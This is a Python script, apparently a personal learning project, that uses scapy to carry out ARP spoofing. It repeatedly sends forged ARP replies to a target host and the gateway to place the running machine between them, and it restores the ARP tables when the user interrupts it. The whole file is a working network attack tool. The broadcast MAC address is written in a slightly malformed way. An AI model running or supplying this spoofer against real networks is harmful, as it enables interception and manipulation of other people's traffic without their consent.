#!/usr/bin/env python
import scapy.all as scapy
import time

import sys

# ----------------------------------------------------------------
# Coded by: Abdullah Alqurashi.
# ----------------------------
# Git-Hub: https://github.com/Kaser2023
# Linked-In: https://www.linkedin.com/in/abdullah-alqurashi-a3777a224/
# Date: 13.Rabi'a Alakhir. 1446 -  2024.Oct.16
# ----------------------------------------------------------------


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="00:0:00:00:00:00")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# --------  Important Note:  -------
# What does [[ "restore" function ]] do, that:
# After quiting the Spoofer prgram, it will reset  the"Mac Addresses" of the [[[target]]] will back to the acutal mac address,
#  and the [[[gateway]]] mac adress will back to the actual address
# ----------------------------------



target_ip = "Targetd_IP"
gateway_ip = "192.168.1.1"

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets Sent: " + str(sent_packet_count), end="")
        # sys.stdout.flush()
        time.sleep(3.0)




except KeyboardInterrupt:
    print("[+] Detected CTRL + C .....Resetting ARP tables..........Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
